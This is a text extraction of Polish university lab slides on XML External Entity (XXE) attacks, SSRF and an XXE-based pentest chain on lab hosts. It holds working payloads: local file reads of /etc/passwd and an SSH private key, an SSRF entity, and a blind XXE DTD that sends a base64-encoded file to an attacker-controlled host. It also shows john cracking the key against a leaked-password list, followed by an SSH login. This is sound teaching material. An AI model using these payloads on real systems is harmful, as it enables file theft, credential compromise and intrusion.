                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wstęp

  Student nauczy się znajdować i wykorzystywać podatność typu XXE (XML External
  Entity).


                                                                                                                                                                              2
s32924 2026-06-21 19:20:00
```

### Strona 3 / 36

#### Tekst

```text
                    XML EXTERNAL ENTITIES                                                                 POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….………   5
                                                         Połączenie OpenVPN ……………………………………  6

                                 TEORIA
                                             Czym jest podatność XXE? .…………………………..  9
                                                         Atrybut HttpOnly ……………..………………..…………  10
                                             Czym jest SSRF? ………………………………..………...  11

                                ZADANIA
                                                     13.1 Podstawowy XXE.…………………….…..………                                                                                        25
                                                     13.2 SSRF ……….……………….…………….….…….…                                                                                         28
                                                     13.3 Blind XXE ……………………………….……….…..                                                                                         31


                                                                                                                                                                              3
s32924 2026-06-21 19:20:00
```

### Strona 4 / 36

#### Tekst

```text
                   XML EXTERNAL ENTITIES                                                                                                                                                    PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:00
```

### Strona 5 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyna WEB - XXE jest włączona. Jeżeli coś
  się zepsuje, w każdej chwili możesz ją przywrócić do stanu początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego panelu, którego lokalizacja znajduje

                                                                                                                                                                              5   się w treści zadania.
s32924 2026-06-21 19:20:00
```

### Strona 6 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              6
s32924 2026-06-21 19:20:00
```

### Strona 7 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              7
s32924 2026-06-21 19:20:00
```

### Strona 8 / 36

#### Tekst

```text
                   XML EXTERNAL ENTITIES                                                                                                                                                    PJA.EDU.PL


         Teoria
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:00
```

### Strona 9 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Czym jest podatność XXE?

  XXE  (XML  External  Entity)  to  podatność  związana  z  przetwarzaniem
  zewnętrznych encji w dokumentach XML. Atakujący może wykorzystać tę lukę,
  aby wstrzyknąć złośliwy kod do żądania XML, co może prowadzić do ujawnienia
  poufnych  danych,  takich  jak  pliki  z  serwera,  lub  umożliwić  wysyłanie
  nieautoryzowanych zapytań do wewnętrznych zasobów sieciowych. XXE może
  również zostać wykorzystane do przeprowadzania ataków typu Denial of
  Service (DoS) poprzez zainicjowanie zasobożernych operacji na serwerze. Aby
  zabezpieczyć  aplikacje przed  tego  typu  atakami,  zaleca  się  wyłączenie
  przetwarzania  zewnętrznych  encji w  parserach XML  oraz  stosowanie
  odpowiednich środków  kontroli dostępu do danych. Podatność XXE  jest
  szczególnie groźna w aplikacjach, które przyjmują dane od użytkowników
    i przetwarzają je bez odpowiedniej walidacji.


                                                                                                                                                                              9
s32924 2026-06-21 19:20:00
```

### Strona 10 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Atrybut HttpOnly

  Dodanie  atrybutu  HttpOnly  do  ciasteczek  (cookies)  jest  kluczowym
  zabezpieczeniem przed atakami XSS. Atrybut HttpOnly uniemożliwia dostęp
  do ciasteczek za pomocą JavaScript, co sprawia, że atakujący nie może ich
  ukraść nawet w przypadku udanego ataku XSS. W kontekście ochrony przed
  CSRF,  ustawienie  flagi HttpOnly na  ciasteczkach  zabezpiecza  je przed
  kradzieżą, co utrudnia wykorzystanie ich do wykonania nieautoryzowanych
  działań na koncie użytkownika. Dzięki temu, nawet jeśli w aplikacji wystąpi
  podatność XSS, atakujący nie będzie w stanie zdobyć ciasteczek sesyjnych
  potrzebnych do przeprowadzenia ataku CSRF. W rezultacie, zadania CSRF
  stają się bardziej odporne na połączenie ataków XSS i CSRF.


                                                                                                                                                                            10
s32924 2026-06-21 19:20:00
```

### Strona 11 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Czym jest SSRF?

  SSRF  (Server-Side  Request  Forgery)  to  podatność,  która  pozwala
  atakującemu na manipulowanie serwerem, aby ten wykonywał żądania
  HTTP do zasobów, do których zwykle nie miałby dostępu. W wyniku takiego
  ataku serwer może uzyskać dostęp do wewnętrznych systemów sieciowych,
  baz danych czy innych usług, które są chronione przed bezpośrednim
  dostępem  z zewnątrz. Atakujący może wykorzystać SSRF do odczytu
  poufnych informacji, takich jak dane konfiguracyjne, lub do przeprowadzenia
  ataków na inne systemy w infrastrukturze. Aby zapobiec tego typu atakom,
  ważne   jest,  aby  ograniczyć  możliwości  serwera  do  wykonywania
  zewnętrznych  żądań  oraz  weryfikować    i  filtrować  dane  wejściowe,
  szczególnie te, które są używane do tworzenia zapytań HTTP. SSRF stanowi
  poważne zagrożenie, zwłaszcza w środowiskach, gdzie serwery mają szeroki
  dostęp do zasobów wewnętrznych.

                                                                                                                                                                            11
s32924 2026-06-21 19:20:00
```

### Strona 12 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XML External Entity Injection (XXE)

  XML External Entity Injection (XXE)  jest rodzajem ataku na aplikację, która
  przetwarza wejście w formacie XML. Atak XXE objawia się, gdy źle skonfigurowany
  parser XML przetwarza odniesienia do zewnętrznych encji. Pomyślnie wykonany
  atak pozwala często na odczyt plików na serwerze, a także na przeprowadzenie
  ataku SSRF.


                                                                                                                                                                            12
s32924 2026-06-21 19:20:00
```

### Strona 13 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XML External Entity Injection (XXE)

  Typowy dokument XML zawiera w pierwszej linii deklarację XML. Następnie
  zaczyna się właściwa treść dokumentu budowana na tagach.


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <foo>
         <example>&quot;test&quot;</example>
   </foo>


                                                                                                                                                                            13
s32924 2026-06-21 19:20:00
```

### Strona 14 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XML External Entity Injection (XXE)

  Dokumenty XML dopuszczają użycie encji, w celu kodowania niektórych znaków.
 W tym przypadku, encja &quot; zostanie zamieniona na znak ".


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <foo>
        <example>&quot;test&quot;</example>
  </foo>


                                                                                                                                                                            14
s32924 2026-06-21 19:20:00
```

### Strona 15 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XML External Entity Injection (XXE)

  Zewnętrzne encje XML są rodzajem niestandardowych encji, których wartości
  są ładowane spoza DTD* w których zostały zadeklarowane.


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <foo>
        <example>&quot;test&quot;</example>
  </foo>


    *Definicja typu dokumentu (DTD) zawiera deklaracje, które mogą definiować strukturę dokumentu XML, typy wartości danych, które może
   zawierać i inne elementy. DTD jest deklarowana w opcjonalnym elemencie DOCTYPE na początku dokumentu XML.


                                                                                                                                                                            15
s32924 2026-06-21 19:20:00
```

### Strona 16 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XXE do przechwytywania plików

 W celu przeprowadzenia ataku XXE injection, w pierwszym kroku utworzymy
  element DOCTYPE, który odczyta plik /etc/passwd.


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <foo>
        <example>&quot;test&quot;</example>
  </foo>


                                                                                                                                                                            16
s32924 2026-06-21 19:20:00
```

### Strona 17 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XXE do przechwytywania plików

  Następnie w treści dokumentu umieszczamy odniesienie do zdefiniowanej
 w ten sposób encji.


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <foo>
        <example>&xxe;</example>
  </foo>


                                                                                                                                                                            17
s32924 2026-06-21 19:20:00
```

### Strona 18 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XXE do przechwytywania plików

  Odpowiedź z aplikacji powinna zawierać zawartość pliku /etc/passwd w ramach
  wartości tagu <example>.


  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nolo
  gin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  [...]


                                                                                                                                                                            18
s32924 2026-06-21 19:20:00
```

### Strona 19 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XXE do ataku SSRF

  Ataki XXE oprócz wydobywania wrażliwych informacji może służyć
  do przeprowadzenia ataku SSRF.


 W tym celu tworzymy deklarację DOCTYPE z docelowym adresem,
  pod który aplikacja ma wykonać zapytanie.


  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable.com/"> ]>


                                                                                                                                                                            19
s32924 2026-06-21 19:20:00
```

### Strona 20 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 XXE do ataku SSRF

 Po przesłaniu dokumentu XML, aplikacja powinna umieścić zawartość odpowiedzi
 HTTP we wskazanym tagu.


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable.com/"> ]>
   <foo>
         <example>&xxe;</example>
  </foo>


                                                                                                                                                                            20
s32924 2026-06-21 19:20:00
```

### Strona 21 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Szukanie podatności XXE

 W trakcie poszukiwań podatności XXE, często dokumenty XML mogą zawierać dużą
  ilość parametrów,  spośród  których każdy może  zostać  wykorzystany  przez
  aplikację. Warto z tego względu testować je wszystkie.


  Same dokumenty XML mogą pojawić się w ramach zwykłego zapytania do aplikacji,
  czy upload’u pliku.


                                                                                                                                                                            21
s32924 2026-06-21 19:20:00
```

### Strona 22 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Szukanie podatności XXE

  Czasami aplikacja potrafi obsługiwać treść XML, pomimo korzystania z  innych
  formatów.
  Atakujący mogą zmienić nagłówek Content-Type na text/xml lub application/xml,
  aby oszukać aplikację i wymusić przetwarzanie danych jako XML.


                                                                                                                                                                            22
s32924 2026-06-21 19:20:00
```

### Strona 23 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Szukanie podatności XXE

  POST /action HTTP/1.0
  Content-Type: application/json
  Content-Length: 7


  {"foo":"bar"}


  POST /action HTTP/1.0
  Content-Type: text/xml
  Content-Length: 7


  <?xml version="1.0" encoding="ISO-8859-1"?>
  <foo>bar</foo>

                                                                                                                                                                            23
s32924 2026-06-21 19:20:00
```

### Strona 24 / 36

#### Tekst

```text
                   XML EXTERNAL ENTITIES                                                                                                                                                    PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:00
```

### Strona 25 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.1: Podstawowy XXE

  Celem zadania jest odczytanie pliku /flag13.1.txt za pomocą podatności XXE.
  Flagę należy wkleić w formularzu na platformie.


  URL: http://192.168.100.13/site1/


                                                                                                                                                                            25
s32924 2026-06-21 19:20:00
```

### Strona 26 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.1: Podstawowy XXE

  Payload:

  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/flag13.1.txt"> ]>
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>&xxe;</heading>
    <body>Don't forget me this weekend!</body>
  </note>

                                                                                                                                                                            26
s32924 2026-06-21 19:20:00
```

### Strona 27 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.1: Podstawowy XXE


                                                                                                                                                                            27
s32924 2026-06-21 19:20:00
```

### Strona 28 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.2: SSRF

  Celem zadania jest wykorzystanie podatności XXE do wysłania zapytania HTTP
  pod adres:


  http://192.168.100.13/solve13.2/


  Za pomocą adresu lokalnego 127.0.0.1!


                                                                                                                                                                            28
s32924 2026-06-21 19:20:00
```

### Strona 29 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.2: SSRF

  Payload:


  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE pjatk [ <!ENTITY ssrf SYSTEM "http://127.0.0.1/solve13.2/"> ]>
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>&ssrf;</heading>
    <body>Don't forget me this weekend!</body>
  </note>


                                                                                                                                                                            29
s32924 2026-06-21 19:20:00
```

### Strona 30 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.2: SSRF

  Zadanie zostanie zaliczone automatycznie. Napis „Error!” nie świadczy o tym, że
  coś zrobiliśmy nie tak.


                                                                                                                                                                            30
s32924 2026-06-21 19:20:00
```

### Strona 31 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3: Blind XXE

  Celem zadania jest odczytanie pliku /flag13.3.txt za pomocą podatności XXE
    i wysłanie jej na Kali. Zadanie nie odbija żadnych danych od parsera XML!
  URL:
  http://192.168.100.13/site3/


                                                                                                                                                                            31
s32924 2026-06-21 19:20:00
```

### Strona 32 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3: Blind XXE
  Na Kali należy zahostować plik xxe.dtd (python -m http.server 80):


  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag13.3.txt">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.65.0.6/%file;'>">
  %eval;
  %exfil;


  Wykorzystuje on zbudowany w php mechanizm php://filter, który zakoduje flagę
  z potencjalnymi specjalnymi znakami za pomocą base64.


                                                                                                                                                                            32
s32924 2026-06-21 19:20:00
```

### Strona 33 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3: Blind XXE

  Payload:
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE pjatk [<!ENTITY % xxe SYSTEM "http://10.65.0.6/xxe.dtd"> %xxe;]>
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
  </note>


                                                                                                                                                                            33
s32924 2026-06-21 19:20:00
```

### Strona 34 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3: Blind XXE


                                                                                                                                                                            34
s32924 2026-06-21 19:20:00
```

### Strona 35 / 36

#### Tekst

```text
                        XML EXTERNAL ENTITIES                                                             POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://cdn.sekurak.pl/html5/xxe/
  Symulacja ataku XXE

  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  XXE „Cheat-sheet” [EN]

  https://portswigger.net/web-security/xxe#how-to-find-and-test-for-xxe-
  vulnerabilities
  Poszukiwanie podatności XXE [EN]


                                                                                                                                                                            35
s32924 2026-06-21 19:20:00
```

### Strona 36 / 36

#### Tekst

```text
                   XML EXTERNAL ENTITIES                                                                                                                                                    PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:00
```

---

## 10. 13p. XXE PENTEST (4)(1).pdf

Liczba stron: 17


### Strona 1 / 17

#### Tekst

```text
                   XML | PENTEST                                                                                                                                                            PJA.EDU.PL
    XML External
         Entities
        Pentest
                        KOMPUTEROWYCH                         Zajęcia nr 13
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 19:20:01
```

### Strona 2 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….………  4
                                                         Połączenie OpenVPN ……………………………………  5

                                ZADANIA
                                                    13.1p Nazwa użytkownika …………………….………  8
                                                    13.2p Klucz prywatny ..……….……………..…..….…  10
                                                    13.3p Hasło do klucza .…………………………….…..  12
                                                    13.4p Połączenie SSH …..………………………….….  14
                                                    13.5p Flaga ………………………………………………….  16


                                                                                                                                                                              2
s32924 2026-06-21 19:20:01
```

### Strona 3 / 17

#### Tekst

```text
                   XML | PENTEST                                                                                                                                                            PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:01
```

### Strona 4 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyny WEB - XXE oraz WEB - XXE PENTEST
  są włączone. Jeżeli coś się zepsuje, w każdej chwili możesz ją przywrócić do stanu
  początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego panelu, którego lokalizacja znajduje się
 w treści zadania.                                                                                                                                             4
s32924 2026-06-21 19:20:01
```

### Strona 5 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn

  Uwaga! Flagi w niektórych zadaniach mają format inny od standardowego!


                                                                                                                                                                              5
s32924 2026-06-21 19:20:01
```

### Strona 6 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              6
s32924 2026-06-21 19:20:01
```

### Strona 7 / 17

#### Tekst

```text
                   XML | PENTEST                                                                                                                                                            PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:01
```

### Strona 8 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.1p: Nazwa użytkownika

  Celem zadania  jest wykorzystanie podatności XXE w celu odczytania  pliku
  /etc/passwd.
  Flagą do zadania jest nazwa użytkownika systemowego - nazwę użytkownika
  należy wysłać formularzem na platformie.


                                         <!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>
  URL:                                          <PLANT>
  http://192.168.100.63/         <COMMON>&xxe;</COMMON>
                                         <BOTANICAL>Sanguinaria canadensis</BOTANICAL>
                                          <ZONE>4</ZONE>
                                         <LIGHT>Mostly Shady</LIGHT>
                                         <AVAILABILITY>031599</AVAILABILITY>
                                         </PLANT>


                                                                                                                                                                              8
s32924 2026-06-21 19:20:01
```

### Strona 9 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.1p: Nazwa użytkownika


                                                                                                                                                                              9
s32924 2026-06-21 19:20:01
```

### Strona 10 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.2p: Klucz prywatny

  Celem zadania jest wykorzystanie podatności XXE w celu odczytania klucza
  prywatnego wcześniej zlokalizowanego użytkownika.


  Domyślna ścieżka do klucza:                                                <!DOCTYPE pjatk [<!ENTITY xxe SYSTEM "/home/sshadmin/.ssh/id_rsa"> ]>

                                                 <PLANT>  /home/sshadmin/.ssh/id_rsa
                                                 <COMMON>&xxe;</COMMON>

                                                <BOTANICAL>Sanguinaria canadensis</BOTANICAL>

                                                 <ZONE>4</ZONE>

                                                <LIGHT>Mostly Shady</LIGHT>

                                                <AVAILABILITY>031599</AVAILABILITY>

                                                </PLANT>


                                                                                                                                                                            10
s32924 2026-06-21 19:20:01
```

### Strona 11 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.2p: Klucz prywatny

  Zadanie zostanie zaliczone automatycznie.


                                                                                                                                                                            11
s32924 2026-06-21 19:20:01
```

### Strona 12 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3p: Hasło do klucza

  Celem zadania  jest  znalezienie prawidłowego  hasła do  klucza prywatnego
 w słowniku /usr/share/seclists/Passwords/Leaked-Databases/carders.cc.txt
  Flagą do zadania  jest hasło do klucza  - hasło należy wysłać formularzem
  na platformie.
  Uwaga! Skopiowanie klucza bezpośrednio ze strony nie zadziała ze względu na
  łamanie linii. Skopiuj go ze źródła strony.


  ssh2john id_rsa > id_rsa.john
  john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/carders.cc.txt id_rsa.john


                                                                                                                                                                            12
s32924 2026-06-21 19:20:01
```

### Strona 13 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.3p: Hasło do klucza


                                                                                                                                                                            13
s32924 2026-06-21 19:20:01
```

### Strona 14 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.4p: Połączenie SSH

  Celem zadania jest połączenie się z hostem 192.168.100.63
  chmod 400 id_rsa
  ssh -i id_rsa sshadmin@192.168.100.63


                                                                                                                                                                            14
s32924 2026-06-21 19:20:01
```

### Strona 15 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 13.5p: Flaga

  Celem zadania jest wylistowanie katalogu domowego i odczytanie flagi.

  ls
  cat *


                                                                                                                                                                            15
s32924 2026-06-21 19:20:01
```

### Strona 16 / 17

#### Tekst

```text
                    XML | PENTEST                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://cdn.sekurak.pl/html5/xxe/
  Symulacja ataku XXE

  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
  XXE „Cheat-sheet” [EN]


                                                                                                                                                                            16
s32924 2026-06-21 19:20:01
```

### Strona 17 / 17

#### Tekst

```text
                   XML | PENTEST                                                                                                                                                            PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 19:20:01
```

---

## 11. 14. File upload (2)(2).pdf

Liczba stron: 28


### Strona 1 / 28

#### Tekst

```text
                   UPLOAD PLIKÓW                                                                                                                                                            PJA.EDU.PL
     Upload Plików


                        KOMPUTEROWYCH                         Zajęcia nr 14
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 17:36:37
```

### Strona 2 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Wstęp

  Student  nauczy  się  wykrywać  różne  rodzaje  błędów  przy  implementacji
  mechanizmu uploadu plików.


                                                                                                                                                                              2
s32924 2026-06-21 17:36:37
```

### Strona 3 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….………  5
                                                         Połączenie OpenVPN ……………………………………  6

                                 TEORIA
                                                      Błędy w implementacji …….…………………………..  9

                                ZADANIA
                                                     14.1 RCE ……………………………………………..……… 13
                                                     14.2 Path Traversal …………….…………………..…… 15
                                                     14.3 Biała lista .………………………….…………….….. 17
                                                     14.4 Nagłówek HTTP ……..………..………..……...… 19
                                                     14.5 Nagłówek pliku ..………………….……………... 21


                                                                                                                                                                              3
s32924 2026-06-21 17:36:37
```

### Strona 4 / 28

#### Tekst

```text
                   UPLOAD PLIKÓW                                                                                                                                                            PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
